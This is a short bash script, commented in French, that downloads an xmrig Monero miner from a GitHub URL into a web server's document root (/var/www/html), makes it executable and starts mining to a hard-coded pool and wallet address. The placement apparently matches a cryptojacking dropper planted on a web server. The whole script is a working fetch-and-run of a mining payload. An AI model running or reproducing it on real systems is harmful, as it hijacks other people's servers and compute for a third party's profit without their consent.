#!/bin/bash

# URL du binaire xmrig
XMRIG_URL="https://raw.githubusercontent.com/estebanbecker/monero-mining/main/xmrig"

# Chemin local pour le binaire xmrig
XMRIG_PATH="/var/www/html/xmrig"

# Adresse du pool et adresse du portefeuille
POOL_ADDRESS="pool.hashvault.pro:443"
WALLET_ADDRESS="48MieRSJv6BSHpoqUYF5Bv6iFkahz6tJvXX8Hw1hYscm8GZgr5vt3PBThEqxkLaTBvh9dFddDsCxMRdMBrd2TbWdFaaKjiQ"

# Télécharger le binaire xmrig
wget -O $XMRIG_PATH $XMRIG_URL

# Rendre le binaire exécutable
chmod +x $XMRIG_PATH

# Lancer le minage
$XMRIG_PATH -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x
